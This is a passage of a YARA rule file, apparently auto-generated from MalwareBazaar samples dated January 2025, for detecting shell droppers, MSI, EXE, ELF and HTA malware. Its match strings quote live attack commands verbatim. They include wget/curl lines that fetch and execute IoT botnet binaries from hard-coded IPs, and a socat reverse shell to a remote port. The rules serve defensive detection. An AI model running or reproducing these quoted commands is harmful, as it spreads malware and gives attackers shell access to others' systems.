      $s1 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s2 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s3 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s4 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s5 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s6 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s7 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s8 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s9 = "> .f; # ; rm -rf .f;" fullword ascii
      $s10 = "; # ; rm -rf .f;" fullword ascii
      $s11 = "./the_rizzler" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 3KB and
      8 of them
}

rule sig_80f64479ea600f1e564d701f6cd514011372994c0e93e72eed08ac364f552eaa {
   meta:
      description = "evidences - file 80f64479ea600f1e564d701f6cd514011372994c0e93e72eed08ac364f552eaa.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "80f64479ea600f1e564d701f6cd514011372994c0e93e72eed08ac364f552eaa"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://83.222.191.90/arm6 ; chmod 777 arm6 ; ./ar" ascii
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://83.222.191.90/arm5 ; chmod 777 arm5 ; ./ar" ascii
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://83.222.191.90/arm7 ; chmod 777 arm7 ; ./ar" ascii
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://83.222.191.90/arm4 ; chmod 777 arm4 ; ./ar" ascii
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://83.222.191.90/arm6 ; chmod 777 arm6 ; ./ar" ascii
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://83.222.191.90/arm5 ; chmod 777 arm5 ; ./ar" ascii
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://83.222.191.90/arm7 ; chmod 777 arm7 ; ./ar" ascii
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://83.222.191.90/arm4 ; chmod 777 arm4 ; ./ar" ascii
      $s9 = "m7 nuuo ; " fullword ascii
      $s10 = "m4 nuuo ;" fullword ascii
      $s11 = "m6 nuuo ;" fullword ascii
      $s12 = "m5 nuuo ;" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      8 of them
}

rule sig_961d3dd7321c215344ec1567d9e518902a2426d29aacc8f4ae61643f0f49f7a0 {
   meta:
      description = "evidences - file 961d3dd7321c215344ec1567d9e518902a2426d29aacc8f4ae61643f0f49f7a0.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "961d3dd7321c215344ec1567d9e518902a2426d29aacc8f4ae61643f0f49f7a0"
   strings:
      $s1 = "wget http://94.156.227.135/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://94.156.227.135/.a/strace -O- > strace" fullword ascii
      $s3 = "wget http://94.156.227.135/.a/gdb -O- > gdb" fullword ascii
      $s4 = "wget http://94.156.227.135/.a/socat -O- > socat" fullword ascii
      $s5 = "./socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:94.156.227.135:4444" fullword ascii
      $s6 = "cd /tmp" fullword ascii
      $s7 = "chmod +x *" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule b4210ad9c0cba464b3505fb8fe43780decf26eeb45ca7ac5de65d286bdc78de5 {
   meta:
      description = "evidences - file b4210ad9c0cba464b3505fb8fe43780decf26eeb45ca7ac5de65d286bdc78de5.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "b4210ad9c0cba464b3505fb8fe43780decf26eeb45ca7ac5de65d286bdc78de5"
   strings:
      $s1 = "wget http://94.156.227.135/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://94.156.227.135/.a/strace -O- > strace" fullword ascii
      $s3 = "wget http://94.156.227.135/.a/gdb -O- > gdb" fullword ascii
      $s4 = "wget http://94.156.227.135/.a/socat -O- > socat" fullword ascii
      $s5 = "./socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:94.156.227.135:4444" fullword ascii
      $s6 = "cd /tmp" fullword ascii
      $s7 = "chmod 777 *" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_97ed6e047f292c278e2c11433c118d83e744476fd19895e2d10ed3840c69f7b2 {
   meta:
      description = "evidences - file 97ed6e047f292c278e2c11433c118d83e744476fd19895e2d10ed3840c69f7b2.hta"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "97ed6e047f292c278e2c11433c118d83e744476fd19895e2d10ed3840c69f7b2"
   strings:
      $s1 = "<script src=\"https://wistfulpotatoes.com/WSZ99/WSZ99gerw/EuWb3831.js\">" fullword ascii
      $s2 = "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" fullword ascii
      $s3 = "<html lang=\"en\">" fullword ascii /* Goodware String - occured 2 times */
      $s4 = "%var4%%var5%" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule d16d3469c3248ea19ebec0c7800423e2121f8edebb33dedb16c9c0565e02acff {
   meta:
      description = "evidences - file d16d3469c3248ea19ebec0c7800423e2121f8edebb33dedb16c9c0565e02acff.xlsx"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "d16d3469c3248ea19ebec0c7800423e2121f8edebb33dedb16c9c0565e02acff"
   strings:
      $s1 = "customXml/itemProps1.xml " fullword ascii
      $s2 = "customXml/itemProps3.xml " fullword ascii
      $s3 = "customXml/itemProps2.xml " fullword ascii
      $s4 = "customXml/itemProps3.xmlPK" fullword ascii
      $s5 = "customXml/itemProps2.xmlPK" fullword ascii
      $s6 = "customXml/itemProps1.xmlPK" fullword ascii
      $s7 = "xl/sharedStrings.xml" fullword ascii
      $s8 = "customXml/_rels/item3.xml.relsPK" fullword ascii
      $s9 = "customXml/item2.xml " fullword ascii
      $s10 = "customXml/_rels/item2.xml.rels " fullword ascii
      $s11 = "Wu:\"='a" fullword ascii
      $s12 = "customXml/_rels/item1.xml.relsPK" fullword ascii
      $s13 = "customXml/_rels/item3.xml.rels " fullword ascii
      $s14 = "customXml/item1.xml " fullword ascii
      $s15 = "customXml/item3.xml " fullword ascii
      $s16 = "xl/sharedStrings.xmlPK" fullword ascii
      $s17 = "customXml/_rels/item2.xml.relsPK" fullword ascii
      $s18 = "docProps/custom.xml " fullword ascii
      $s19 = "customXml/_rels/item1.xml.rels " fullword ascii
      $s20 = "docProps/custom.xmlPK" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 80KB and
      8 of them
}

rule ee0faf107bf34a08c98f720ef0ff6225b14df94b50baa2d827451ad04f4d5971 {
   meta:
      description = "evidences - file ee0faf107bf34a08c98f720ef0ff6225b14df94b50baa2d827451ad04f4d5971.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "ee0faf107bf34a08c98f720ef0ff6225b14df94b50baa2d827451ad04f4d5971"
   strings:
      $s1 = "cd /tmp; wget http://194.37.81.64/Aqua.ppc; curl -O http://194.37.81.64/Aqua.ppc; chmod 777 *; ./Aqua.ppc jaws;" fullword ascii
      $s2 = "cd /tmp; wget http://194.37.81.64/Aqua.x86_64; curl -O http://194.37.81.64/Aqua.x86_64; chmod 777 *; ./Aqua.x86_64 jaws;" fullword ascii
      $s3 = "cd /tmp; wget http://194.37.81.64/Aqua.arm6; curl -O http://194.37.81.64/Aqua.arm6; chmod 777 *; ./Aqua.arm6 jaws;" fullword ascii
      $s4 = "cd /tmp; wget http://194.37.81.64/Aqua.mips; curl -O http://194.37.81.64/Aqua.mips; chmod 777 *; ./Aqua.mips jaws;" fullword ascii
      $s5 = "cd /tmp; wget http://194.37.81.64/Aqua.i686; curl -O http://194.37.81.64/Aqua.i686; chmod 777 *; ./Aqua.i686 jaws;" fullword ascii
      $s6 = "cd /tmp; wget http://194.37.81.64/Aqua.x86; curl -O http://194.37.81.64/Aqua.x86; chmod 777 *; ./Aqua.x86 jaws;" fullword ascii
      $s7 = "cd /tmp; wget http://194.37.81.64/Aqua.arm7; curl -O http://194.37.81.64/Aqua.arm7; chmod 777 *; ./Aqua.arm7 jaws;" fullword ascii
      $s8 = "cd /tmp; wget http://194.37.81.64/Aqua.mpsl; curl -O http://194.37.81.64/Aqua.mpsl; chmod 777 *; ./Aqua.mpsl jaws;" fullword ascii
      $s9 = "cd /tmp; wget http://194.37.81.64/Aqua.sh4; curl -O http://194.37.81.64/Aqua.sh4; chmod 777 *; ./Aqua.sh4 jaws;" fullword ascii
      $s10 = "cd /tmp; wget http://194.37.81.64/Aqua.arm5; curl -O http://194.37.81.64/Aqua.arm5; chmod 777 *; ./Aqua.arm5 jaws;" fullword ascii
      $s11 = "cd /tmp; wget http://194.37.81.64/Aqua.m68k; curl -O http://194.37.81.64/Aqua.m68k; chmod 777 *; ./Aqua.m68k jaws;" fullword ascii
      $s12 = "cd /tmp; wget http://194.37.81.64/Aqua.arm4; curl -O http://194.37.81.64/Aqua.arm4; chmod 777 *; ./Aqua.arm4 jaws;" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 4KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _0bf6022a5b7a615cbacddd3f0d4844d84fcba68c5a3185cae59f46930bc43fed_3d306f1ed48daae3c9bc67cd068aa5821191dc4b301431c7badb63fea9_0 {
   meta:
      description = "evidences - from files 0bf6022a5b7a615cbacddd3f0d4844d84fcba68c5a3185cae59f46930bc43fed.msi, 3d306f1ed48daae3c9bc67cd068aa5821191dc4b301431c7badb63fea9b36230.msi, 591ff1092ef559ef1247093d6aa0d829c344c863a09d57f5d01d882f03630d81.msi, cea9ff02e6556a05a92102e33e516bf937bc47f431c0771912c34c7e4d8653d5.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "0bf6022a5b7a615cbacddd3f0d4844d84fcba68c5a3185cae59f46930bc43fed"
      hash2 = "3d306f1ed48daae3c9bc67cd068aa5821191dc4b301431c7badb63fea9b36230"
      hash3 = "591ff1092ef559ef1247093d6aa0d829c344c863a09d57f5d01d882f03630d81"
      hash4 = "cea9ff02e6556a05a92102e33e516bf937bc47f431c0771912c34c7e4d8653d5"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "get_loader_name_from_dll" fullword ascii
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "Update.dll" fullword ascii
      $s8 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s9 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s10 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s11 = "get_loader_name" fullword ascii
      $s12 = "qgethostname" fullword ascii
      $s13 = "process_config_directive" fullword ascii
      $s14 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s17 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s18 = "qregexec" fullword ascii
      $s19 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
      $s20 = "vloader_failure" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6_810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec6368_1 {
   meta:
      description = "evidences - from files 4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6.exe, 810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec636844fb84.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6"
      hash2 = "810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec636844fb84"
   strings:
      $s1 = "C:\\Program Files\\Common Files\\SSL/cert.pem" fullword ascii
      $s2 = "ticket_appdata" fullword ascii
      $s3 = "C:\\Program Files\\Common Files\\SSL/certs" fullword ascii
      $s4 = "C:\\Program Files\\Common Files\\SSL" fullword ascii
      $s5 = "Private-Key: (%d bit, %d primes)" fullword ascii
      $s6 = "%s:%d: OpenSSL internal error: %s" fullword ascii
      $s7 = "\\(a8Bk" fullword ascii /* reversed goodware string 'kB8a(\\' */
      $s8 = "siphash" fullword ascii
      $s9 = " JJ5Jj" fullword ascii /* reversed goodware string 'jJ5JJ ' */
      $s10 = "hexsecret" fullword ascii
      $s11 = "Microsoft Smartcard Login" fullword ascii
      $s12 = "hexpass" fullword ascii
      $s13 = "  No Private Key" fullword ascii
      $s14 = "%*s%s Private-Key:" fullword ascii
      $s15 = "EXPORTER_SECRET" fullword ascii
      $s16 = "No ciphers enabled for max supported SSL/TLS version" fullword ascii
      $s17 = "assertion failed: keylen <= sizeof(key)" fullword ascii
      $s18 = "%*s%s Public-Key:" fullword ascii
      $s19 = "%*s<INVALID PRIVATE KEY>" fullword ascii
      $s20 = "  Private Key Info:" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0824e07cbc4c5e599c9c74cf38731a59e6e72e09a0d21c0f9bbdb964087255f3_29ff469e33d40be4a1e8f457c0551fd1ebe5d0b96c5b088d7298c0ef9c_2 {
   meta:
      description = "evidences - from files 0824e07cbc4c5e599c9c74cf38731a59e6e72e09a0d21c0f9bbdb964087255f3.rar, 29ff469e33d40be4a1e8f457c0551fd1ebe5d0b96c5b088d7298c0ef9c2bfee6.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "0824e07cbc4c5e599c9c74cf38731a59e6e72e09a0d21c0f9bbdb964087255f3"
      hash2 = "29ff469e33d40be4a1e8f457c0551fd1ebe5d0b96c5b088d7298c0ef9c2bfee6"
   strings:
      $s1 = "+ |xl&" fullword ascii
      $s2 = "R/tVeBP!pO" fullword ascii
      $s3 = "hWjuJ2n\\y" fullword ascii
      $s4 = "D\"%S_D" fullword ascii
      $s5 = "&ihrDe@KUk" fullword ascii
      $s6 = "NIInB:s" fullword ascii
      $s7 = "\\\\=2o+Z" fullword ascii
      $s8 = "\\fC G:$I" fullword ascii
      $s9 = "k&#eq[" fullword ascii
      $s10 = "FV0MZL" fullword ascii
      $s11 = "EZ#*KD" fullword ascii
      $s12 = "wc$|GU" fullword ascii
      $s13 = "t=r!)sFS3" fullword ascii
      $s14 = ")'`T6u" fullword ascii
      $s15 = "7&rB!<" fullword ascii
      $s16 = "JS?M:M" fullword ascii
      $s17 = "JA/[_]" fullword ascii
      $s18 = "/b}cQD$" fullword ascii
      $s19 = "jz?B?k!" fullword ascii
      $s20 = "d!e,Xk" fullword ascii
   condition:
      ( ( uint16(0) == 0x6152 or uint16(0) == 0x0000 ) and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9_dabb17eca3efee983ed6a96071f94346643745b2cadcb35872f2d534c1_3 {
   meta:
      description = "evidences - from files 0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9.elf, dabb17eca3efee983ed6a96071f94346643745b2cadcb35872f2d534c1a564c5.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9"
      hash2 = "dabb17eca3efee983ed6a96071f94346643745b2cadcb35872f2d534c1a564c5"
   strings:
      $s1 = "Remote I/O error" fullword ascii
      $s2 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s3 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s4 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s5 = "Wrong medium type" fullword ascii
      $s6 = "Not a XENIX named type file" fullword ascii
      $s7 = "Is a named type file" fullword ascii
      $s8 = "Structure needs cleaning" fullword ascii
      $s9 = "npxXoudifFeEgGaACScs" fullword ascii
      $s10 = "hlLjztqZ" fullword ascii
      $s11 = "No XENIX semaphores available" fullword ascii
      $s12 = "Streams pipe error" fullword ascii /* Goodware String - occured 2 times */
      $s13 = "Interrupted system call should be restarted" fullword ascii
      $s14 = "No medium found" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "Invalid cross-device link" fullword ascii /* Goodware String - occured 3 times */
      $s16 = "RFS specific error" fullword ascii /* Goodware String - occured 3 times */
      $s17 = "Attempting to link in too many shared libraries" fullword ascii /* Goodware String - occured 3 times */
      $s18 = "File descriptor in bad state" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "Bad font file format" fullword ascii /* Goodware String - occured 3 times */
      $s20 = "Can not access a needed shared library" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9_4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb99_4 {
   meta:
      description = "evidences - from files 0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9.elf, 4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6.exe, 810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec636844fb84.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9"
      hash2 = "4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6"
      hash3 = "810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec636844fb84"
   strings:
      $s1 = "CHACHA20" fullword ascii
      $s2 = "emailAddress" fullword ascii /* Goodware String - occured 109 times */
      $s3 = "DTLSv1.2" fullword ascii /* Goodware String - occured 2 times */
      $s4 = "DES-EDE3-ECB" fullword ascii
      $s5 = "DES-EDE-ECB" fullword ascii
      $s6 = "CAMELLIA-192-CCM" fullword ascii
      $s7 = "CAMELLIA-256-GCM" fullword ascii
      $s8 = "CAMELLIA-128-CTR" fullword ascii
      $s9 = "CAMELLIA-192-GCM" fullword ascii
      $s10 = "CAMELLIA-256-CCM" fullword ascii
      $s11 = "CAMELLIA-192-CTR" fullword ascii
      $s12 = "CAMELLIA-128-CCM" fullword ascii
      $s13 = "CAMELLIA-256-CTR" fullword ascii
      $s14 = "CAMELLIA-128-GCM" fullword ascii
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _85d8183f2497705952ed6bc547abdfe1072cbed72d0faa055de949d6d92d8f5f_88a5ec4709e75598c567094063013148a1e1ae8b3cefcffe096f7b0a57_5 {
   meta:
      description = "evidences - from files 85d8183f2497705952ed6bc547abdfe1072cbed72d0faa055de949d6d92d8f5f.elf, 88a5ec4709e75598c567094063013148a1e1ae8b3cefcffe096f7b0a574573e2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "85d8183f2497705952ed6bc547abdfe1072cbed72d0faa055de949d6d92d8f5f"
      hash2 = "88a5ec4709e75598c567094063013148a1e1ae8b3cefcffe096f7b0a574573e2"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "8$? 'oQY" fullword ascii
      $s4 = "f#F_R?" fullword ascii
      $s5 = "B28q/M" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _5bc44c8a78da90b1bba46651deb79cdf8ccff8d2754dfe00a0800756aa02fbe9_5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e_6 {
   meta:
      description = "evidences - from files 5bc44c8a78da90b1bba46651deb79cdf8ccff8d2754dfe00a0800756aa02fbe9.sh, 5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a.sh, 652d2ab3900da5cf25a34b2c2f953b65c19ddc884939a95ec9a4c270cc1bf3c1.sh, 73e0e33fe8b95f30fb70d6dff19636966facb01b15bfd8dc267d065f49975d90.unknown, 7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4925bdb.sh, a404d547abd7795fbf281f75cf9b4d0754a2e813a72c8c76c4a65285e4d8aceb.sh, ac5a11026f814874b9b3aa699833ab0c7874f21044f8829ee07eeb703bf31b10.sh, f29c3cd591c941f4fad481ed31917a701b873200bae178ce120905aff69762a6.sh, f64ccf3af412a12c88084c555719f65008653ea1bc5e2e3050e7757581c341ac.sh, f8c2237e66078a6b3004fa1c07afcb0a9b3c632da49e894e5063de47449f652e.sh, fb98fba85979aa8a2fc94866e47a8c0ff79a94f86f0c5e88a3f4d72ab2df9c23.sh, fcc45c93576fbf91b4b852edbd810a55d12e74a5b0faefec4e18d5c977f16eab.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "5bc44c8a78da90b1bba46651deb79cdf8ccff8d2754dfe00a0800756aa02fbe9"
      hash2 = "5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a"
      hash3 = "652d2ab3900da5cf25a34b2c2f953b65c19ddc884939a95ec9a4c270cc1bf3c1"
      hash4 = "73e0e33fe8b95f30fb70d6dff19636966facb01b15bfd8dc267d065f49975d90"
      hash5 = "7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4925bdb"
      hash6 = "a404d547abd7795fbf281f75cf9b4d0754a2e813a72c8c76c4a65285e4d8aceb"
      hash7 = "ac5a11026f814874b9b3aa699833ab0c7874f21044f8829ee07eeb703bf31b10"
      hash8 = "f29c3cd591c941f4fad481ed31917a701b873200bae178ce120905aff69762a6"
      hash9 = "f64ccf3af412a12c88084c555719f65008653ea1bc5e2e3050e7757581c341ac"
      hash10 = "f8c2237e66078a6b3004fa1c07afcb0a9b3c632da49e894e5063de47449f652e"
      hash11 = "fb98fba85979aa8a2fc94866e47a8c0ff79a94f86f0c5e88a3f4d72ab2df9c23"
      hash12 = "fcc45c93576fbf91b4b852edbd810a55d12e74a5b0faefec4e18d5c977f16eab"
   strings:
      $s1 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s2 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s3 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii
      $s4 = ">/var/tmp/.a && cd /var/tmp;" fullword ascii
      $s5 = ">/home/.a && cd /home;" fullword ascii
      $s6 = ">/tmp/.a && cd /tmp;" fullword ascii
      $s7 = ">/var/.a && cd /var;" fullword ascii
      $s8 = ">/dev/shm/.a && cd /dev/shm;" fullword ascii
      $s9 = ">/dev/.a && cd /dev;" fullword ascii
   condition:
      ( uint16(0) == 0x2f3e and filesize < 7KB and ( all of them )
      ) or ( all of them )
}

rule _5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a_7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4_7 {
   meta:
      description = "evidences - from files 5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a.sh, 7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4925bdb.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a"
      hash2 = "7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4925bdb"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s2 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s3 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s4 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s5 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s6 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s7 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s8 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
   condition:
      ( uint16(0) == 0x2f3e and filesize < 3KB and ( all of them )
      ) or ( all of them )
}

rule _961d3dd7321c215344ec1567d9e518902a2426d29aacc8f4ae61643f0f49f7a0_b4210ad9c0cba464b3505fb8fe43780decf26eeb45ca7ac5de65d286bd_8 {
   meta:
      description = "evidences - from files 961d3dd7321c215344ec1567d9e518902a2426d29aacc8f4ae61643f0f49f7a0.sh, b4210ad9c0cba464b3505fb8fe43780decf26eeb45ca7ac5de65d286bdc78de5.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "961d3dd7321c215344ec1567d9e518902a2426d29aacc8f4ae61643f0f49f7a0"
      hash2 = "b4210ad9c0cba464b3505fb8fe43780decf26eeb45ca7ac5de65d286bdc78de5"
   strings:
      $s1 = "wget http://94.156.227.135/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://94.156.227.135/.a/strace -O- > strace" fullword ascii
      $s3 = "wget http://94.156.227.135/.a/gdb -O- > gdb" fullword ascii
      $s4 = "wget http://94.156.227.135/.a/socat -O- > socat" fullword ascii
      $s5 = "cd /tmp" fullword ascii
